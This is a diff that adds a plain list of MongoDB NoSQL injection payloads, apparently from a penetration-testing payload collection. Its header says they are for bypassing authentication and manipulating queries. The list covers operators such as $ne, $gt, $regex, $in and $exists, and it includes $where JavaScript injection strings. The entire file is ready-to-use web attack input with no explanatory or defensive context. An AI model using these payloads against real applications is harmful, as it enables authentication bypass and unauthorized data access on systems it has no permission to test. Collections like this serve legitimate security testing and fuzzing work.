@@ -1,0 +1,63 @@
+# NoSQL Injection - MongoDB Operator Payloads
+# Used for bypassing authentication and manipulating queries
+# JSON format operators
+
+# $ne (not equal) - Always true bypass
+{"$ne": ""}
+{"$ne": null}
+{"$ne": "invalid"}
+{"$ne": 1}
+{"$ne": -1}
+
+# $gt (greater than) - Always true for strings
+{"$gt": ""}
+{"$gt": null}
+{"$gte": ""}
+{"$gte": null}
+
+# $lt (less than)
+{"$lt": "~"}
+{"$lt": "zzz"}
+{"$lte": "~"}
+
+# $regex - Pattern matching
+{"$regex": ".*"}
+{"$regex": "^.*$"}
+{"$regex": ".+"}
+{"$regex": "^."}
+{"$regex": ""}
+{"$regex": ".*", "$options": "i"}
+{"$regex": "^a"}
+
+# $exists - Check field existence
+{"$exists": true}
+{"$exists": false}
+
+# $in - Value in array
+{"$in": ["admin", "administrator", "root", "user"]}
+{"$in": [""]}
+{"$in": [null]}
+
+# $nin - Value not in array
+{"$nin": []}
+{"$nin": [""]}
+
+# $or - Logical OR
+{"$or": [{"a": 1}, {"b": 1}]}
+
+# $and - Logical AND
+{"$and": [{"$ne": ""}, {"$exists": true}]}
+
+# $type - Type checking bypass
+{"$type": 2}
+{"$type": "string"}
+
+# $where - JavaScript injection
+{"$where": "1==1"}
+{"$where": "this.password.length > 0"}
+{"$where": "return true"}
+
+# Combined operators
+{"$ne": "", "$exists": true}
+{"$gt": "", "$lt": "~"}
+{"$regex": ".*", "$ne": null}
